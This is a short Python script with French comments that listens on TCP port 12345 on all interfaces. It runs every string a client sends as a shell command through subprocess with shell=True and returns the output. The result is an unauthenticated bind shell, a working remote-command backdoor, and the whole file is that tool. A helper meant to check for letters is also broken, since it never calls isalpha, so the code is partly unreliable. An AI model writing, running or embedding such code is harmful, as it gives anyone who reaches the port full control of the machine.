import socket
import subprocess

# Création d'un socket TCP
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Liaison du socket à l'adresse et au port
server_socket.bind(('0.0.0.0', 12345))

# Attente des connexions
server_socket.listen(5)

print("En attente d'une connexion...")
def isalphabet(char):
       if (char.isalpha):
           return 'true'   
       return 'false'
while True:
    # Acceptation de la connexion
    client_socket, client_address = server_socket.accept()
    print(f"Connexion de {client_address}")

    # Réception des données
    data = client_socket.recv(1024)
    client_request=data.decode('utf-8')
    resulta=isalphabet(client_request[0])
    print(f"Données reçues : {client_request}")

    # Envoi de données au client
    client_socket.sendall(resulta.encode('utf-8'))
    
    # Commande à exécuter dans le terminal
    commande = client_request  
    resultat = subprocess.run(commande, capture_output=True, text=True, shell=True)
    if len(resultat.stderr.encode('utf-8'))>0:
         client_socket.sendall(resultat.stderr.encode('utf-8'))
    elif len(resultat.stdout.encode('utf-8'))>0 :
        client_socket.sendall(resultat.stdout.encode('utf-8'))
              
    # Fermeture de la connexion
    client_socket.close()
